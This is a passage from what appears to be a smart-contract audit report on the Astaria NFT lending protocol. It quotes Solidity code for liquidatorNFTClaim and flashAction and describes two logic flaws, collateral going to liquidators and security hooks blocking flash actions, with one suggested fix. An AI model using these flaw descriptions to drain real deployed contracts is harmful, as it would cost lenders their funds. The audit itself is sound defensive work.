free. But the lenders of the loan take the loss.</p>\n<p>However, the lenders should have the claim to the collateral, since originally the funds are provided by the lenders. If the collateral at the end is owned by whoever calls the liquidation function, it is not fair for the lenders. And will discourage future users to use the protocol.</p>\n<p>In CollateralToken contract</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"166\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">liquidatorNFTClaim</span><span class=\"mtk1\">(</span><span class=\"mtk12\">OrderParameters</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">CollateralStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadCollateralSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">offer</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">computeId</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">offer</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">identifierOrCriteria</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liquidator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">LIEN_TOKEN</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAuctionLiquidator</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralIdToAuction</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">] == </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) ||</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">liquidator</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">//revert no auction</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidCollateralState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidCollateralStates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">NO_AUCTION</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralIdToAuction</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">] != </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">//revert auction params dont match</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidCollateralState</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">InvalidCollateralStates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">INVALID_AUCTION_PARAMS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endTime</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">//auction hasn&#39;t ended yet</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidCollateralState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidCollateralStates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">AUCTION_ACTIVE</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Asset</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">underlying</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">idToUnderlying</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">underlying</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">underlying</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ClearingHouse</span><span class=\"mtk1\"> </span><span class=\"mtk12\">CH</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ClearingHouse</span><span class=\"mtk1\">(</span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">]));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">CH</span><span class=\"mtk1\">.</span><span class=\"mtk11\">settleLiquidatorNFTClaim</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_releaseToAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">, </span><span class=\"mtk12\">underlying</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">liquidator</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>Note the code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"167\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_releaseToAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">, </span><span class=\"mtk12\">underlying</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">liquidator</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The code above will send the NFT to liquidator inside of the lenders.</p>\n<h3 id=\"recommended-mitigation-steps-54\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-54\" aria-label=\"recommended mitigation steps 54 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>If there is no bidder for the auction, allow the NFT to get auctioned for another chance.</p>\n<h2 id=\"05-security-hook-should-not-be-set-for-a-nft-that-is-not-uniswap-v3-position-nft\" style=\"position:relative;\"><a href=\"#05-security-hook-should-not-be-set-for-a-nft-that-is-not-uniswap-v3-position-nft\" aria-label=\"05 security hook should not be set for a nft that is not uniswap v3 position nft permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/109\">[05] Security hook should not be set for a NFT that is not Uniswap V3 Position NFT</a></h2>\n<p>Security hook should not be set in a NFT that is not Uniswap V3 Position NFT, otherwise the flash auction flow can be blocked.</p>\n<h3 id=\"proof-of-concept-48\" style=\"position:relative;\"><a href=\"#proof-of-concept-48\" aria-label=\"proof of concept 48 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>If we look into the workflow of the flashAction, </p>\n<p>According to the documentation, the flashAction is implemented.</p>\n<p><a href=\"https://docs.astaria.xyz/docs/protocol-mechanics/flashactions\">https://docs.astaria.xyz/docs/protocol-mechanics/flashactions</a></p>\n<blockquote>\n<p>FlashActions allow borrowers to take advantage of the utility of their locked NFTs. A FlashAction allows the user to unlock their underlying collateral and perform any action with the NFT as long as it is returned within the same block.</p>\n</blockquote>\n<blockquote>\n<p>The FlashAction is a powerful tool that allows borrowers to perform actions on their NFTs without having to worry about the collateralization of their loan. We have a number of use cases for FlashActions, at launch however we plan to support any developer that would like to extend our FlashActions functionality.</p>\n</blockquote>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"168\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">flashAction</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IFlashAction</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">CollateralStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadCollateralSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">getUnderlying</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">flashEnabled</span><span class=\"mtk1\">[</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">]) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidCollateralState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidCollateralStates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">FLASH_DISABLED</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">LIEN_TOKEN</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">) == </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ACTIVE_AUCTION&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidCollateralState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidCollateralStates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">AUCTION_ACTIVE</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">preTransferState</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//look to see if we have a security handler for this asset</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">securityHook</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">securityHooks</span><span class=\"mtk1\">[</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">securityHook</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">preTransferState</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ISecurityHook</span><span class=\"mtk1\">(</span><span class=\"mtk12\">securityHook</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// transfer the NFT to the destination optimistically</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ClearingHouse</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">transferUnderlying</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//trigger the flash action on the receiver</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">.</span><span class=\"mtk11\">onFlashAction</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IFlashAction</span><span class=\"mtk1\">.</span><span class=\"mtk11\">Underlying</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">], </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ) != </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;FlashAction.onFlashAction&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FlashActionCallbackFailed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">securityHook</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">preTransferState</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">ISecurityHook</span><span class=\"mtk1\">(</span><span class=\"mtk12\">securityHook</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FlashActionSecurityCheckFailed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// validate that the NFT returned after the call</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">IERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">).</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">) != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FlashActionNFTNotReturned</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>In the implementation above, if the security hook is set, the validation code runs:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"169\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">preTransferState</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//look to see if we have a security handler for this asset</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">securityHook</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">securityHooks</span><span class=\"mtk1\">[</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">securityHook</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">preTransferState</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ISecurityHook</span><span class=\"mtk1\">(</span><span class=\"mtk12\">securityHook</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>and in the end of the flashAction:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"170\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span 